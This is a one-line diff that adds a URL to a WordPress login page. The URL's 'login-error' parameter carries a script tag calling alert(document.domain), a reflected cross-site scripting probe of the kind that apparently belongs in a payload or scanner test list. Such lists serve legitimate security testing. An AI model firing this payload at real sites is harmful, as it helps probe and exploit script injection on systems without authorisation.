@@ -1,0 +1,1 @@
+/wp-login.php?login-error=<script>alert(document.domain)</script>
